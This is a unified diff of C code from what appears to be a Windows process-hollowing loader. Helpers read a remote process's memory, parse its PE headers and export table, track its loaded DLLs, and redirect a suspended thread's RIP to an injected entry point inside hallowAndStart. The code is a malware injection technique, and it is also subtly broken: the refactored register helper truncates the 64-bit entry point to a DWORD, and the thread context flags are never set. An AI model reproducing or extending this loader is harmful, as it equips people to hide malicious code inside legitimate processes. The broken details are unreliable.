@@ -284,7 +284,7 @@ extern void lowercase(char* str){
     }
 }
 
-extern bool syncLoadedDlls(char* dll,__uint64_t exportDirBase, DLL** dllList,size_t *count){
+extern bool syncLoadedDlls(char* dll,__uint64_t dllBase,__uint64_t exportDirBase, DLL** dllList,size_t *count){
 // dll is on heap
 ++(*count);
 DLL* tmp=realloc(*dllList,(*count)*sizeof(DLL));
@@ -294,6 +294,7 @@ else
     exit(1);
 (*dllList)[*count-1].dll_name=dll;
 (*dllList)[*count-1].exportDirBase=exportDirBase;
+(*dllList)[*count-1].dll_base=dllBase;
 // finish tthis 
 printf("DLL added to loaded dlls list\n");
 return true;
@@ -308,14 +309,14 @@ extern void dumpLoadedDlls(DLL* dllList,size_t* count){
 }
 
 
-extern bool isDllLoaded(char* dll,DLL* loaded_list,size_t* count){
+extern DLL* isDllLoaded(char* dll,DLL* loaded_list,size_t* count){
+    DLL zero={0};
     for(unsigned int i=0;i<*count;i++)
         if(strcmp(dll,loaded_list[i].dll_name)==0)
-            return true;
-    return false;
+            return (DLL*)((DLL*)loaded_list+i);
+    return NULL;
 
 }
-
 
 static bool ReadRemoteMemory(HANDLE proc,LPCVOID remoteAddress, LPVOID localBuffer, SIZE_T size) {
     SIZE_T bytesRead = 0;
@@ -324,29 +325,20 @@ static bool ReadRemoteMemory(HANDLE proc,LPCVOID remoteAddress, LPVOID localBuff
 
 extern __uint64_t extractImageExportTableBase(HANDLE proc,BYTE* imageBase) {
     if (!imageBase) return 0;
-
     IMAGE_DOS_HEADER dosHeader;
-    if (!ReadRemoteMemory(proc,imageBase, &dosHeader, sizeof(IMAGE_DOS_HEADER))) {
+    if (!ReadRemoteMemory(proc,imageBase, &dosHeader, sizeof(IMAGE_DOS_HEADER))) 
         return 0;
-    }
-
-    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
+    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) 
         return 0; 
-    }
-
     BYTE* ntHeadersPtr = imageBase + dosHeader.e_lfanew;
-    
     IMAGE_NT_HEADERS32 ntHeaders32;
     if (!ReadRemoteMemory(proc,ntHeadersPtr, &ntHeaders32, sizeof(IMAGE_NT_HEADERS32))) {
         return 0;
     }
-
     if (ntHeaders32.Signature != IMAGE_NT_SIGNATURE) {
         return 0; 
     }
-
     DWORD exportDirRVA = 0;
-
     if (ntHeaders32.OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
         IMAGE_NT_HEADERS64 ntHeaders64;
         if (!ReadRemoteMemory(proc,ntHeadersPtr, &ntHeaders64, sizeof(IMAGE_NT_HEADERS64))) {
@@ -365,15 +357,17 @@ extern __uint64_t extractImageExportTableBase(HANDLE proc,BYTE* imageBase) {
         return 0; 
     }
 
-    return (__uint64_t)(imageBase + exportDirRVA);
+    return (__uint64_t)(imageBase+exportDirRVA);
 }
 
-
-extern __uint64_t extractImageExportTableBase_LS(char* dll,DLL*ls){
-
-
+void _adj_CPU_REGISTERS_(HANDLE thread,DWORD rip){
+    CONTEXT thContext;
+    if(!GetThreadContext(thread,&thContext))
+        printf("[-] 288!\n");
+    thContext.Rip=rip;
+    if(!SetThreadContext(thread,&thContext))
+        printf("[-] 293!\n");
 }
-
 
 
 bool hallowAndStart(HANDLE proc,HANDLE thread,BYTE* pe){
@@ -487,13 +481,7 @@ printf("address of entry point is: %llu\n",entryPont);
 
 
 printf("ENTRY POINT: %llu\n",entryPont);
-CONTEXT thContext;
-if(!GetThreadContext(thread,&thContext))
-    printf("[-] 288!\n");
-    
-thContext.Rip=(DWORD64)entryPont;
-if(!SetThreadContext(thread,&thContext))
-    printf("[-] 293!\n");
+_adj_CPU_REGISTERS_(thread,(DWORD)entryPont);
 
 printf("PRESS ENT TO RESUME THREAD!\n");
 getchar();
